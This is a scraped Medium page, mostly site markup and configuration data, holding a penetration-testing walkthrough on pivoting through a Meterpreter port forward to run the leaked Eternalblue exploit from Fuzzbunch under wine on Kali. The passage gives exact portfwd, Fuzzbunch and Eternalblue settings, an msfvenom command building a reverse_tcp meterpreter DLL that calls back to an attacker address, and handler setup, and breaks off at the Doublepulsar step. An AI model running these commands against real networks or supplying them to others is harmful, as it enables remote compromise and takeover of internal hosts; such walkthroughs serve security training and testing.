2.966L15.262 1z"/><path d="M18.634 2.224l-1.432-.47-.408 3.022z"/><path d="M11.79 1.754l-1.431.47 1.84 2.552z"/><path d="M24.472 14.307l-3.023-5.32c-.287-.426-.689-.705-1.123-.776a1.16 1.16 0 0 0-.911.221c-.297.231-.474.515-.535.84.017.022.036.04.053.063l2.843 5.001c1.95 3.564 1.328 6.973-1.843 10.144a8.46 8.46 0 0 1-.549.501c1.205-.156 2.328-.737 3.351-1.76 3.268-3.268 3.041-6.749 1.737-8.914"/><path d="M14.58 10.887c-.156-.83.096-1.569.692-2.142L12.78 6.252c-.5-.504-1.378-.504-1.879 0-.178.18-.273.4-.329.63l4.008 4.005z"/><path d="M17.812 10.04c-.218-.323-.539-.55-.88-.606a.814.814 0 0 0-.644.153c-.176.137-.713.553-.24 1.566l1.43 3.025a.539.539 0 1 1-.868.612L9.2 7.378a.986.986 0 1 0-1.395 1.395l4.401 4.403a.538.538 0 1 1-.762.762L7.046 9.54 5.802 8.295a.99.99 0 0 0-1.396 0 .981.981 0 0 0 0 1.394l1.241 1.241 4.402 4.403a.537.537 0 0 1 0 .761.535.535 0 0 1-.762 0L4.89 11.696a.992.992 0 0 0-1.399-.003.983.983 0 0 0 0 1.395l1.855 1.854 2.763 2.765a.538.538 0 0 1-.76.761l-2.765-2.764a.982.982 0 0 0-1.395 0 .989.989 0 0 0 0 1.395l5.32 5.32c3.371 3.372 6.64 4.977 10.49 1.126C21.74 20.8 22.271 18 20.62 14.982l-2.809-4.942z"/></g></svg></span></span></button></div><span class="u-relative u-background js-actionMultirecommendCount u-marginLeft5"><button class="button button--chromeless u-baseColor--buttonNormal js-multirecommendCountButton"  data-action="show-recommends" data-action-value="edd877dfd724">8</button></span></div></li><li class="u-marginVertical10 u-marginLeft3"><button class="button button--large button--dark button--chromeless is-touchIconFadeInPulse u-baseColor--buttonDark button--withIcon button--withSvgIcon button--bookmark js-bookmarkButton"  title="Bookmark this story to read later" aria-label="Bookmark this story to read later" data-action="sign-up-prompt" data-sign-in-action="add-to-bookmarks" data-requires-token="true" data-redirect="https://medium.com/_/bookmark/p/edd877dfd724" data-action-source="post_share_widget-----edd877dfd724---------------------bookmark_sidebar"><span class="button-defaultState"><span class="svgIcon svgIcon--bookmark svgIcon--29px"><svg class="svgIcon-use" width="29" height="29" ><path d="M19.385 4h-9.77A2.623 2.623 0 0 0 7 6.615V23.01a1.022 1.022 0 0 0 1.595.847l5.905-4.004 5.905 4.004A1.022 1.022 0 0 0 22 23.011V6.62A2.625 2.625 0 0 0 19.385 4zM21 23l-5.91-3.955-.148-.107a.751.751 0 0 0-.884 0l-.147.107L8 23V6.615C8 5.725 8.725 5 9.615 5h9.77C20.275 5 21 5.725 21 6.615V23z" fill-rule="evenodd"/></svg></span></span><span class="button-activeState"><span class="svgIcon svgIcon--bookmarkFilled svgIcon--29px"><svg class="svgIcon-use" width="29" height="29" ><path d="M19.385 4h-9.77A2.623 2.623 0 0 0 7 6.615V23.01a1.022 1.022 0 0 0 1.595.847l5.905-4.004 5.905 4.004A1.022 1.022 0 0 0 22 23.011V6.62A2.625 2.625 0 0 0 19.385 4z" fill-rule="evenodd"/></svg></span></span></button></li><li class="u-marginVertical10 u-marginLeft3"><button class="button button--large button--dark button--chromeless is-touchIconBlackPulse u-baseColor--buttonDark button--withIcon button--withSvgIcon"  title="Share on Twitter" aria-label="Share on Twitter" data-action="share-on-twitter" data-action-source="post_share_widget"><span class="svgIcon svgIcon--twitterFilled svgIcon--29px"><svg class="svgIcon-use" width="29" height="29" ><path d="M22.053 7.54a4.474 4.474 0 0 0-3.31-1.455 4.526 4.526 0 0 0-4.526 4.524c0 .35.04.7.082 1.05a12.9 12.9 0 0 1-9.3-4.77c-.39.69-.61 1.46-.65 2.26.03 1.6.83 2.99 2.02 3.79-.72-.02-1.41-.22-2.02-.57-.01.02-.01.04 0 .08-.01 2.17 1.55 4 3.63 4.44-.39.08-.79.13-1.21.16-.28-.03-.57-.05-.81-.08.54 1.77 2.21 3.08 4.2 3.15a9.564 9.564 0 0 1-5.66 1.94c-.34-.03-.7-.06-1.05-.08 2 1.27 4.38 2.02 6.94 2.02 8.31 0 12.86-6.9 12.84-12.85.02-.24.01-.43 0-.65.89-.62 1.65-1.42 2.26-2.34-.82.38-1.69.62-2.59.72a4.37 4.37 0 0 0 1.94-2.51c-.84.53-1.81.9-2.83 1.13z"/></svg></span></button></li><li class="u-marginVertical10 u-marginLeft3"><a class="button button--dark button--chromeless u-baseColor--buttonDark button--withIcon button--withSvgIcon button--dark button--chromeless"   href="https://medium.com/p/edd877dfd724/share/facebook" title="Share on Facebook" aria-label="Share on Facebook" target="_blank" data-action-source="post_share_widget"><span class="button-defaultState"><span class="svgIcon svgIcon--facebookSquare svgIcon--29px"><svg class="svgIcon-use" width="29" height="29" ><path d="M23.209 5H5.792A.792.792 0 0 0 5 5.791V23.21c0 .437.354.791.792.791h9.303v-7.125H12.72v-2.968h2.375v-2.375c0-2.455 1.553-3.662 3.741-3.662 1.049 0 1.95.078 2.213.112v2.565h-1.517c-1.192 0-1.469.567-1.469 1.397v1.963h2.969l-.594 2.968h-2.375L18.11 24h5.099a.791.791 0 0 0 .791-.791V5.79a.791.791 0 0 0-.791-.79"/></svg></span></span></a></li></ul></div></aside><div class="u-fixed u-bottom0 u-width100pct u-backgroundWhite u-boxShadowTop u-borderBox u-paddingTop10 u-paddingBottom10 u-zIndexMetabar u-xs-paddingLeft10 u-xs-paddingRight10 js-stickyFooter"><div class="u-maxWidth700 u-marginAuto u-flexCenter"><div class="u-fontSize16 u-flex1 u-flexCenter"><div class="u-flex0 u-inlineBlock u-paddingRight20 u-xs-paddingRight10"><a class="link u-baseColor--link avatar u-inline"   href="https://medium.com/@joe_norton" data-action="show-user-card" data-action-value="5652bace719b" data-action-type="hover" data-user-id="5652bace719b" dir="auto"><img  src="https://cdn-images-1.medium.com/fit/c/40/40/1*dmbNkD5D-u45r44go_cf0g.png" class="avatar-image avatar-image--smaller" alt="Go to the profile of Joe Norton"></a></div><div class="u-flex1 u-inlineBlock"><div class="u-xs-hide">Never miss a story from<strong> Joe Norton</strong>, when you sign up for Medium. <a class="link u-baseColor--link link--accent u-accentColor--textNormal u-accentColor--textDarken"   href="https://medium.com/@Medium/personalize-your-medium-experience-with-users-publications-tags-26a41ab1ee0c#.hx4zuv3mg" data-action-source="sticky_footer">Learn more</a></div><div class="u-xs-show">Never miss a story from<strong> Joe Norton</strong></div></div></div><div class="u-marginLeft50 u-xs-marginAuto"><span class="followState js-followState" data-user-id="5652bace719b"><button class="button u-noUserSelect button--withChrome u-baseColor--buttonNormal button--withHover button--unblock js-unblockButton u-uiTextSemibold u-textUppercase u-fontSize12"  data-action="sign-up-prompt" data-sign-in-action="toggle-block-user" data-requires-token="true" data-redirect="https://medium.com/@joe_norton/running-eternalblue-on-kali-through-a-meterpreter-port-forward-edd877dfd724" data-action-source="sticky_footer"><span class="button-label  button-defaultState">Blocked</span><span class="button-label button-hoverState">Unblock</span></button><button class="button button--primary is-active u-noUserSelect button--withChrome u-accentColor--buttonNormal button--follow js-followButton u-uiTextSemibold u-textUppercase u-fontSize12"  data-action="sign-up-prompt" data-sign-in-action="toggle-subscribe-user" data-requires-token="true" data-redirect="https://medium.com/_/subscribe/user/5652bace719b" data-action-source="sticky_footer-5652bace719b-------------------------follow_metabar"><span class="button-label  button-defaultState js-buttonLabel">Follow</span><span class="button-label button-activeState">Get updates</span></button></span></div></div></div></div></div></div><div class="loadingBar"></div><script>// <![CDATA[
window["obvInit"] = function (opt_embedded) {window["obvInit"]["embedded"] = opt_embedded; window["obvInit"]["ready"] = true;}
// ]]></script><script>// <![CDATA[
var GLOBALS = {"audioUrl":"https://d1fcbxp97j4nb2.cloudfront.net","baseUrl":"https://medium.com","buildLabel":"36266-6b9702a","currentUser":{"userId":"lo_S54htN6xjJnm","isVerified":false,"subscriberEmail":"","hasPastMemberships":false,"isEnrolledInHightower":false,"isEligibleForHightower":false,"hightowerLastLockedAt":0,"isWriterProgramEnrolled":false,"isWriterProgramInvited":false,"isWriterProgramOptedOut":false,"writerProgramVersion":0,"writerProgramEnrolledAt":0,"friendLinkOnboarding":0,"hasAdditionalUnlocks":false},"currentUserHasUnverifiedEmail":false,"isAuthenticated":false,"isCurrentUserVerified":false,"language":"id-id","miroUrl":"https://cdn-images-1.medium.com","moduleUrls":{"base":"https://cdn-static-1.medium.com/_/fp/gen-js/main-base.bundle.08gwIO466egOJvHC8DIwCQ.js","common-async":"https://cdn-static-1.medium.com/_/fp/gen-js/main-common-async.bundle._ukiIhnby-zUJ9H29CLk3A.js","hightower":"https://cdn-static-1.medium.com/_/fp/gen-js/main-hightower.bundle.mtDtgnormglSTWOLVuGFiQ.js","home-screens":"https://cdn-static-1.medium.com/_/fp/gen-js/main-home-screens.bundle.rJX9qJPbgF7kd4f3erLMfg.js","misc-screens":"https://cdn-static-1.medium.com/_/fp/gen-js/main-misc-screens.bundle.3fLSIKoOXbcWAHAXGMUjPQ.js","notes":"https://cdn-static-1.medium.com/_/fp/gen-js/main-notes.bundle.ICJa3kY4R7zbC_zCE3G0ww.js","payments":"https://cdn-static-1.medium.com/_/fp/gen-js/main-payments.bundle.dSzaBEBlFSIaepCswq_M0A.js","posters":"https://cdn-static-1.medium.com/_/fp/gen-js/main-posters.bundle.WjP642PK-tDXMcw6QSx2sw.js","power-readers":"https://cdn-static-1.medium.com/_/fp/gen-js/main-power-readers.bundle.VDoDvR4FrR2Zd_xYNYllkw.js","pubs":"https://cdn-static-1.medium.com/_/fp/gen-js/main-pubs.bundle.Dt0uDshtmC5r6cUxOucW5A.js","stats":"https://cdn-static-1.medium.com/_/fp/gen-js/main-stats.bundle.9H0U7cIxJJQFVbryJ248Jw.js"},"previewConfig":{"weightThreshold":1,"weightImageParagraph":0.51,"weightIframeParagraph":0.8,"weightTextParagraph":0.08,"weightEmptyParagraph":0,"weightP":0.003,"weightH":0.005,"weightBq":0.003,"minPTextLength":60,"truncateBoundaryChars":20,"detectTitle":true,"detectTitleLevThreshold":0.15},"productName":"Medium","supportsEdit":true,"termsUrl":"//medium.com/policy/9db0094a1e0f","textshotHost":"textshot.medium.com","transactionId":"1547736832790:c7746014520f","useragent":{"browser":"chrome","family":"chrome","os":"windows","version":69,"supportsDesktopEdit":true,"supportsInteract":true,"supportsView":true,"isMobile":false,"isTablet":false,"isNative":false,"supportsFileAPI":true,"isTier1":true,"clientVersion":"","unknownParagraphsBad":false,"clientChannel":"","supportsRealScrollEvents":true,"supportsVhUnits":true,"ruinsViewportSections":false,"supportsHtml5Video":true,"supportsMagicUnderlines":true,"isWebView":false,"isFacebookWebView":false,"supportsProgressiveMedia":true,"supportsPromotedPosts":true,"isBot":false,"isNativeIphone":false,"supportsCssVariables":true,"supportsVideoSections":true,"emojiSupportLevel":1,"isSearchBot":false,"isSyndicationBot":false,"isNativeAndroid":false,"supportsScrollableMetabar":true},"variants":{"allow_access":true,"allow_signup":true,"allow_test_auth":"disallow","signin_services":"twitter,facebook,google,email,google-fastidv,google-one-tap","signup_services":"twitter,facebook,google,email,google-fastidv,google-one-tap","google_sign_in_android":true,"reengagement_notification_duration":3,"browsable_stream_config_bucket":"curated-topics","enable_dedicated_series_tab_api_ios":true,"enable_post_import":true,"available_monthly_plan":"60e220181034","available_annual_plan":"2c754bcc2995","disable_ios_resume_reading_toast":true,"is_not_medium_subscriber":true,"glyph_font_set":"m2","enable_branding":true,"enable_branding_fonts":true,"enable_friend_link_onboarding":true,"max_premium_content_per_user_under_metering":3,"enable_automated_mission_control_triggers":true,"enable_top_stories_for_you":true,"enable_ios_member_post_labeling":true,"enable_lite_profile":true,"enable_topic_lifecycle_email":true,"enable_marketing_emails":true,"enable_truncated_rss_for_tags_and_topics":true,"enable_parsely":true,"enable_branch_io":true,"enable_synchronous_parsely":true,"enable_ios_post_stats":true,"enable_lite_topics":true,"enable_lite_stories":true,"redis_read_write_splitting":true,"enable_tipalti_onboarding":true,"annual_renewal_reminder_email_variant":"fun","enable_annual_renewal_reminder_email":true,"enable_sift_integration":true,"enable_sift_science_webhook":true,"enable_janky_spam_rules":"users,posts","enable_new_collaborative_filtering_data":true,"android_rating_prompt_stories_read_threshold":2,"enable_gifting_flow":true,"enable_smart_meter_without_incentive":true,"stripe_v3":true,"enable_google_one_tap":true,"elevate_headline_fell":true,"enable_email_sign_in_captcha":true,"enable_social_shares_in_new_tab":true,"enable_january_meter_email_test":true,"enable_sharing_is_caring":true},"xsrfToken":"","iosAppId":"828256236","supportEmail":"yourfriends@medium.com","fp":{"/icons/monogram-mask.svg":"https://cdn-static-1.medium.com/_/fp/icons/monogram-mask.KPLCSFEZviQN0jQ7veN2RQ.svg","/icons/favicon-dev-editor.ico":"https://cdn-static-1.medium.com/_/fp/icons/favicon-dev-editor.YKKRxBO8EMvIqhyCwIiJeQ.ico","/icons/favicon-hatch-editor.ico":"https://cdn-static-1.medium.com/_/fp/icons/favicon-hatch-editor.BuEyHIqlyh2s_XEk4Rl32Q.ico","/icons/favicon-medium-editor.ico":"https://cdn-static-1.medium.com/_/fp/icons/favicon-medium-editor.PiakrZWB7Yb80quUVQWM6g.ico"},"authBaseUrl":"https://medium.com","imageUploadSizeMb":25,"isAuthDomainRequest":true,"algoliaApiEndpoint":"https://MQ57UUUQZ2-dsn.algolia.net","algoliaAppId":"MQ57UUUQZ2","algoliaSearchOnlyApiKey":"394474ced050e3911ae2249ecc774921","iosAppStoreUrl":"https://itunes.apple.com/app/medium-everyones-stories/id828256236?pt=698524&mt=8","iosAppLinkBaseUrl":"medium:","algoliaIndexPrefix":"medium_","androidPlayStoreUrl":"https://play.google.com/store/apps/details?id=com.medium.reader","googleClientId":"216296035834-k1k6qe060s2tp2a2jam4ljdcms00sttg.apps.googleusercontent.com","androidPackage":"com.medium.reader","androidPlayStoreMarketScheme":"market://details?id=com.medium.reader","googleAuthUri":"https://accounts.google.com/o/oauth2/auth","androidScheme":"medium","layoutData":{"useDynamicScripts":false,"googleAnalyticsTrackingCode":"UA-24232453-2","jsShivUrl":"https://cdn-static-1.medium.com/_/fp/js/shiv.RI2ePTZ5gFmMgLzG5bEVAA.js","useDynamicCss":false,"faviconUrl":"https://cdn-static-1.medium.com/_/fp/icons/favicon-rebrand-medium.3Y6xpZ-0FSdWDnPM3hSBIA.ico","faviconImageId":"1*8I-HPL0bfoIzGied-dzOvA.png","fontSets":[{"id":8,"url":"https://glyph.medium.com/css/e/sr/latin/e/ssr/latin/e/ssb/latin/m2.css"},{"id":11,"url":"https://glyph.medium.com/css/m2.css"},{"id":9,"url":"https://glyph.medium.com/css/mkt.css"},{"id":10,"url":"https://glyph.medium.com/css/elv8.css"},{"id":14,"url":"https://glyph.medium.com/css/fell.css"}],"editorFaviconUrl":"https://cdn-static-1.medium.com/_/fp/icons/favicon-rebrand-medium-editor.3Y6xpZ-0FSdWDnPM3hSBIA.ico","glyphUrl":"https://glyph.medium.com"},"authBaseUrlRev":"moc.muidem//:sptth","isDnt":false,"stripePublishableKey":"pk_live_7FReX44VnNIInZwrIIx6ghjl","archiveUploadSizeMb":100,"paymentData":{"currencies":{"1":{"label":"US Dollar","external":"usd"}},"countries":{"1":{"label":"United States of America","external":"US"}},"accountTypes":{"1":{"label":"Individual","external":"individual"},"2":{"label":"Company","external":"company"}}},"previewConfig2":{"weightThreshold":1,"weightImageParagraph":0.05,"raiseImage":true,"enforceHeaderHierarchy":true,"isImageInsetRight":true},"isAmp":false,"iosScheme":"medium","isSwBoot":false,"lightstep":{"accessToken":"ce5be895bef60919541332990ac9fef2","carrier":"{\"ot-tracer-spanid\":\"66b7830a2fdb6077\",\"ot-tracer-traceid\":\"6fb1c6965605c480\",\"ot-tracer-sampled\":\"true\"}","host":"collector-medium.lightstep.com"},"facebook":{"key":"542599432471018","namespace":"medium-com","scope":{"default":["public_profile","email"],"connect":["public_profile","email"],"login":["public_profile","email"],"share":["public_profile","email"]}},"editorsPicksTopicId":"3985d2a191c5","popularOnMediumTopicId":"9d34e48ecf94","memberContentTopicId":"13d7efd82fb2","audioContentTopicId":"3792abbd134","brandedSequenceId":"7d337ddf1941","isDoNotAuth":false,"goldfinchUrl":"https://goldfinch.medium.com","buggle":{"url":"https://buggle.medium.com","videoUrl":"https://cdn-videos-1.medium.com","audioUrl":"https://cdn-audio-1.medium.com"},"referrerType":5,"isMeteredOut":false,"meterConfig":{"maxUnlockCount":3,"windowLength":"MONTHLY"},"partnerProgramEmail":"partnerprogram@medium.com","userResearchPrompts":[{"promptId":"lo_post_page_4","type":0,"url":"www.calendly.com"},{"promptId":"lo_home_page","type":1,"url":"www.calendly.com"},{"promptId":"lo_profile_page","type":2,"url":"www.calendly.com"}],"recaptchaKey":"6LdAokEUAAAAAC7seICd4vtC8chDb3jIXDQulyUJ","signinWallCustomDomainCollectionIds":["3a8144eabfe3","336d898217ee","61061eb0c96b","138adf9c44c","819cc2aaeee0"],"countryCode":"ID","bypassMeter":false,"branchKey":"key_live_ofxXr2qTrrU9NqURK8ZwEhknBxiI6KBm","paypal":{"clientMode":"production","oneYearGift":{"name":"Medium Membership (1 Year, Digital Gift Code)","description":"Unlimited access to the best and brightest stories on Medium. Gift codes can be redeemed at medium.com/redeem.","price":"50.00","currency":"USD","sku":"membership-gift-1-yr"}}}
// ]]></script><script charset="UTF-8" src="https://cdn-static-1.medium.com/_/fp/gen-js/main-base.bundle.08gwIO466egOJvHC8DIwCQ.js" async></script><script>// <![CDATA[
window["obvInit"]({"value":{"id":"edd877dfd724","versionId":"72c1cdcde240","creatorId":"5652bace719b","creator":{"userId":"5652bace719b","name":"Joe Norton","username":"joe_norton","createdAt":1490139156472,"imageId":"1*dmbNkD5D-u45r44go_cf0g.png","backgroundImageId":"","bio":"","twitterScreenName":"","socialStats":{"userId":"5652bace719b","usersFollowedCount":5,"usersFollowedByCount":18,"type":"SocialStats"},"social":{"userId":"lo_S54htN6xjJnm","targetUserId":"5652bace719b","type":"Social"},"facebookAccountId":"","allowNotes":1,"mediumMemberAt":0,"isNsfw":false,"type":"User"},"homeCollectionId":"","title":"Running Fuzzbunch on Kali Through a Meterpreter Port Forward","detectedLanguage":"en","latestVersion":"72c1cdcde240","latestPublishedVersion":"72c1cdcde240","hasUnpublishedEdits":false,"latestRev":994,"createdAt":1496077253010,"updatedAt":1521481216570,"acceptedAt":0,"firstPublishedAt":1496101574299,"latestPublishedAt":1496801323198,"vote":false,"experimentalCss":"","displayAuthor":"","content":{"subtitle":"Eternalblue and the rest of the Windows exploits released by the Equation Group are built to run on Windows, not Linux. While there are…","bodyModel":{"paragraphs":[{"name":"29e2","type":3,"text":"Running Fuzzbunch on Kali Through a Meterpreter Port Forward","markups":[]},{"name":"1d10","type":1,"text":"Eternalblue and the rest of the Windows exploits released by the Equation Group are built to run on Windows, not Linux. While there are people working hard to port the exploits over to Metasploit, currently the only supported versions are x64 Windows7 and Windows 2008R2, whereas the actual Eternalblue exploit in the Equation Group leak can exploit x86 versions of 7/2008 and XP.","markups":[{"type":3,"start":159,"end":195,"href":"https://github.com/RiskSense-Ops/MS17-010","title":"","rel":"","anchorType":0}]},{"name":"0313","type":1,"text":"The Equation Group leak has been ported to Linux via wine and this new Linux friendly version can be downloaded here — https://github.com/mdiazcl/fuzzbunch-debian. Fuzzbunch is the name of the framework used that contains Eternalblue, Doublepulsar and several other exploits. I won’t go through the setup in this post since the readme in the github repo does a great job of explaining how to get this running on Kali.","markups":[{"type":3,"start":119,"end":162,"href":"https://github.com/mdiazcl/fuzzbunch-debian","title":"","rel":"nofollow noopener","anchorType":0}]},{"name":"213a","type":1,"text":"In my previous post I went over how to attack internal hosts through a meterpreter session using Metasploit’s socks4a proxy services. This technique works great for most of the network based scanning and attack tools in Kali but was not effective for fuzzbunch in wine.","markups":[]},{"name":"d890","type":1,"text":"Another pivoting option that Metasploit offers is portfwd. Once you establish a meterpreter shell to an internal machine you can forward individual ports directly to internal hosts. The attacker machine will start listening on the port specified, with that port being bound to the running metasploit instance, which in turn forwards the traffic through the meterpreter session to whatever destination IP is defined in the portfwd command.","markups":[]},{"name":"70e7","type":1,"text":"In this scenario we have the attacker -10.0.0.35 on one side of the firewall with an established meterpreter session to 192.168.55.100.","markups":[]},{"name":"c71c","type":4,"text":"Visio Depicting the Network Layout of the Scenario","markups":[],"layout":1,"metadata":{"id":"1*YWkR0KDY3TLvNwlGoF0s9w.png","originalWidth":821,"originalHeight":644}},{"name":"11de","type":1,"text":"Once the pivot host’s externally facing service is compromised and a meterpreter shell is achieved, we need to configure portfwd to relay traffic to internal hosts. The command in this case would be:","markups":[]},{"name":"9971","type":8,"text":"portfwd add -l 9000 -p 445 -r 192.168.55.65","markups":[]},{"name":"55a2","type":1,"text":"The breakdown of the command is like this:","markups":[]},{"name":"bebc","type":1,"text":"“-l 9000” : The port that will receive the traffic on the attacker host","markups":[]},{"name":"c32b","type":1,"text":"“-p 445” : The port on the internal victim that will be accessed","markups":[]},{"name":"6e0f","type":1,"text":"“ -r 192.168.55.65” : The internal victim","markups":[]},{"name":"cd39","type":4,"text":"Pivot Machine is Exploited and portfwd is Configured for Attacking an Internal Host","markups":[],"layout":1,"metadata":{"id":"1*wQlfph0fKZ88G__-P3N4mg.png","originalWidth":1137,"originalHeight":199}},{"name":"c76c","type":1,"text":"Once the the portfwd is established, the attacker machine is listening on port 9000 and anything sent to that port will reach the internal victim on the defined destination port. As our first test, we can scan the new internal victim to confirm it is vulnerable to the Eternalblue exploit by using auxiliary/scanner/smb/smb_ms17_010.","markups":[]},{"name":"040b","type":4,"text":"Scanning The Internal Host for MS17–010 Vulnerability","markups":[],"layout":1,"metadata":{"id":"1*oqwdmK9Wrv5H5fGVEyWp5w.png","originalWidth":1416,"originalHeight":485}},{"name":"e1ae","type":1,"text":"The traffic flow in this example is as follows:","markups":[]},{"name":"ea36","type":4,"text":"","markups":[],"layout":1,"metadata":{"id":"1*P4Jga1j8eU0oEfDTmhTV1g.png","originalWidth":580,"originalHeight":752,"isFeatured":true}},{"name":"eb53","type":1,"text":"Everything is in place to start using fuzzbunch to exploit the internal host. In a new terminal on the attacker machine, start fuzzbunch by running:","markups":[]},{"name":"1b2b","type":8,"text":"#!/bin/bash\nexport WINEPREFIX=$HOME/.wine-fuzzbunch\ncd $HOME/.wine-fuzzbunch/drive_c/fuzzbunch-debian/windows\nwine cmd.exe\npython fb.py","markups":[]},{"name":"2af2","type":1,"text":"Once fuzzbunch has been launched you need to set the default target IP, callback IP, and project. The target and callback can be changed later and you’re not locked into using these the entire session.","markups":[]},{"name":"5e12","type":8,"text":"[+] Set FbStorage =\x3e C:\\fuzzbunch-debian\\windows\\storage","markups":[]},{"name":"284b","type":8,"text":"[*] Retargetting Session","markups":[]},{"name":"13d0","type":8,"text":"[?] Default Target IP Address [] : 127.0.0.1\n[?] Default Callback IP Address [] : 10.0.0.35\n[?] Use Redirection [yes] :","markups":[]},{"name":"44bd","type":8,"text":"[?] Base Log directory [C:\\fuzzbunch-debian\\logs] : \n[*] Checking C:\\fuzzbunch-debian\\logs for projects\nIndex     Project                 \n-----     -------                 \n0         eternalblue-pivot       \n1         testing                 \n2         test                    \n3         Create a New Project","markups":[]},{"name":"1fd6","type":8,"text":"[?] Project [0] : 0\n[?] Set target log directory to 'C:\\fuzzbunch-debian\\logs\\eternalblue-pivot\\z127.0.0.1'? [Yes] :","markups":[{"type":1,"start":0,"end":19}]},{"name":"69dc","type":8,"text":"[*] Initializing Global State\n[+] Set TargetIp =\x3e 127.0.0.1\n[+] Set CallbackIp =\x3e 10.0.0.35","markups":[{"type":1,"start":30,"end":91}]},{"name":"0cae","type":8,"text":"[+] Redirection ON\n[+] Set LogDir =\x3e C:\\fuzzbunch-debian\\logs\\eternalblue-pivot\\z127.0.0.1\n[+] Set Project =\x3e eternalblue-pivot","markups":[]},{"name":"b292","type":8,"text":"fb \x3e","markups":[]},{"name":"6a80","type":1,"text":"After that we’ll launch eternalblue, which will pull in the IP info we just entered:","markups":[]},{"name":"d0fa","type":8,"text":"fb \x3e use eternalblue","markups":[]},{"name":"a415","type":8,"text":"[!] Entering Plugin Context :: Eternalblue\n[*] Applying Global Variables\n[+] Set NetworkTimeout =\x3e 60\n[+] Set TargetIp =\x3e 127.0.0.1","markups":[{"type":1,"start":122,"end":131}]},{"name":"74e1","type":8,"text":"[*] Applying Session Parameters\n[*] Running Exploit Touches","markups":[]},{"name":"c188","type":8,"text":"[!] Enter Prompt Mode :: Eternalblue","markups":[]},{"name":"20fe","type":8,"text":"Module: Eternalblue\n===================","markups":[]},{"name":"48ef","type":8,"text":"Name                  Value                                                 \n----                  -----                                                 \nNetworkTimeout        60                                                    \nTargetIp              127.0.0.1                                             \nTargetPort            445                                                   \nVerifyTarget          True                                                  \nVerifyBackdoor        True                                                  \nMaxExploitAttempts    3                                                     \nGroomAllocations      12                                                    \nTarget                WIN72K8R2","markups":[]},{"name":"1baf","type":8,"text":"[!] plugin variables are valid\n[?] Prompt For Variable Settings? [Yes] :","markups":[]},{"name":"be8d","type":1,"text":"Most of the settings are defaults, but be careful when it comes time to define the target port. In this case we have to use the local port defined in the portfwd command, 9000, as Eternalblue will default to 445. Hit enter at the “Prompt for Variable Settings” prompt to enter the new target port:","markups":[]},{"name":"fab0","type":8,"text":"[?] Prompt For Variable Settings? [Yes] :","markups":[]},{"name":"32cd","type":8,"text":"[*]  NetworkTimeout :: Timeout for blocking network calls (in seconds). Use -1 for no timeout.","markups":[]},{"name":"2e2f","type":8,"text":"[?] NetworkTimeout [60] :","markups":[]},{"name":"61a9","type":8,"text":"[*]  TargetIp :: Target IP Address","markups":[]},{"name":"93ed","type":8,"text":"[?] TargetIp [127.0.0.1] :","markups":[]},{"name":"e36f","type":8,"text":"[*]  TargetPort :: Port used by the SMB service for exploit connection","markups":[]},{"name":"8547","type":8,"text":"[?] TargetPort [445] : 9000","markups":[{"type":1,"start":0,"end":27}]},{"name":"6c1a","type":1,"text":"The next setting that will deviate from the defaults is the delivery mechanism. Be sure to select “Traditional deployment from within FUZZBUNCH” here:","markups":[]},{"name":"8ce2","type":8,"text":"[*]  Mode :: Delivery mechanism","markups":[]},{"name":"0aeb","type":8,"text":"*0) DANE     Forward deployment via DARINGNEOPHYTE\n    1) FB       Traditional deployment from within FUZZBUNCH","markups":[]},{"name":"9f66","type":8,"text":"[?] Mode [0] :1","markups":[]},{"name":"970a","type":1,"text":"At this point we’re ready to run the exploit. If everything is setup correctly you should see “WIN” when the exploit is successful. It may take more than one try, but be persistent if you’re sure the host is vulnerable:","markups":[]},{"name":"25fb","type":4,"text":"Eternalblue Being Run in Wine Pointing to 127.0.0.1:9000","markups":[],"layout":1,"metadata":{"id":"1*9quX4peexWCBZkXWygJMFQ.png","originalWidth":997,"originalHeight":1015}},{"name":"1656","type":1,"text":"From the pivot machine we can see that traffic is being forwarded to the internal victim thanks to the meterpeter portfwd:","markups":[]},{"name":"8ba0","type":4,"text":"Pivot Host Shows Traffic Being Forwarded to Target","markups":[],"layout":1,"metadata":{"id":"1*Yr4wrPh_KW9FsA77GezcpA.png","originalWidth":1029,"originalHeight":772}},{"name":"6b3e","type":1,"text":"Once the Eternalblue exploit is succesful, the next step is to use the Doublepulsar module to inject a DLL of our choosing into a process on the victim. In this case we’ll run a DLL that contains a meterpreter payload to establish a reverse shell back to our attacker machine.","markups":[]},{"name":"b6e3","type":1,"text":"To generate the payload we’ll use msfvenom and to make things easier we’ll generate the payload in the directory that fuzzbunch is launched from:","markups":[]},{"name":"8a38","type":8,"text":"root@dewey:/# cd $HOME/.wine-fuzzbunch/drive_c/fuzzbunch-debian/windows","markups":[{"type":1,"start":14,"end":71}]},{"name":"73b2","type":8,"text":"root@dewey:~/.wine-fuzzbunch/drive_c/fuzzbunch-debian/windows# msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=10.0.0.35 lport=4444 — platform windows -f dll -o file.dll","markups":[{"type":1,"start":63,"end":175}]},{"name":"e378","type":8,"text":"No platform was selected, choosing Msf::Module::Platform::Windows from the payload\nNo Arch selected, selecting Arch: x64 from the payload\nNo encoder or badchars specified, outputting raw payload\nPayload size: 510 bytes\nFinal size of dll file: 5120 bytes\nSaved as: file.dll","markups":[{"type":1,"start":254,"end":272}]},{"name":"6c0c","type":1,"text":"We also need to prepare Metasploit to receive the connection from the new victim once the DLL is injected by using exploit/multi/handler, making sure the payload, lport and lhost match our msfvenom command from the previous step:","markups":[]},{"name":"b3dc","type":8,"text":"msf exploit(handler) \x3e show options","markups":[]},{"name":"93b5","type":8,"text":"Module options (exploit/multi/handler):","markups":[]},{"name":"4d0e","type":8,"text":"Name  Current Setting  Required  Description\n   ----  ---------------  --------  -----------","markups":[]},{"name":"1b27","type":8,"text":"Payload options (windows/x64/meterpreter/reverse_tcp):","markups":[{"type":1,"start":17,"end":52}]},{"name":"b57f","type":8,"text":"Name      Current Setting  Required  Description\n   ----      ---------------  --------  -----------\n   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)\n   LHOST     10.0.0.35        yes       The listen address\n   LPORT     4444             yes       The listen port","markups":[{"type":1,"start":212,"end":221},{"type":1,"start":271,"end":288}]},{"name":"39a7","type":8,"text":"Exploit target:","markups":[]},{"name":"c7a8","type":8,"text":"Id  Name\n   --  ----\n   0   Wildcard Target","markups":[]},{"name":"db9a","type":4,"text":"Reststart the Handler In Metasploit, Matching DLL Created With Msfvenom","markups":[],"layout":1,"metadata":{"id":"1*gpOLtgoyBa43hhiVH_aPOw.png","originalWidth":1146,"originalHeight":510}},{"name":"746c","type":1,"text":"Next, from fuzzbunch run “use doublepulsar”. The module options are pretty straightforward. Be sure that the target port matches (9000 in 